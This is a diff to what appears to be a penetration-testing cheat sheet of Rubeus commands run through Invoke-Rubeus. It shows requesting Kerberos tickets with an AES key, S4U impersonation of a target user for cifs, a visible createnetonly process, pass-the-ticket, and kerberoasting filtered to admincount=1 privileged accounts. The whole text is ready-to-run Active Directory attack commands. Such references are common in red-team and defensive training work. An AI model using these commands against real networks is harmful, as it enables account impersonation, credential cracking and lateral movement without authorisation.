@@ -41,9 +41,9 @@ Invoke-Rubeus -Command 'asktgt /user:<user> /domain:<domain> /aes256:<aes> /dc:<
 Invoke-Rubeus -Command 's4u /impersonateuser:<targetUser> /msdsspn:http/<fqdnRhost> /ticket:<base64> /altservice:cifs'
 ```
 
-### Create new process
+### Create new process (show pop up cmd shell)
 ```
-Invoke-Rubeus -Command 'createnetonly /program:C:\Windows\System32\cmd.exe'
+Invoke-Rubeus -Command 'createnetonly /program:C:\Windows\System32\cmd.exe /show'
 ```
 
 ### Pass a ticket to the process
@@ -53,7 +53,7 @@ Invoke-Rubeus -Command 'ptt /luid:<luid> /ticket:<base64>'
 
 ### Kerberoasting using john format
 ```
-Invoke-Rubeus -Command 'kerberoast /outfile:<file>.txt '
+Invoke-Rubeus -Command 'kerberoast /outfile:<file>.txt /ldapfilter:"admincount=1"'
 ```
 
 ### Asrep roasting using john format 
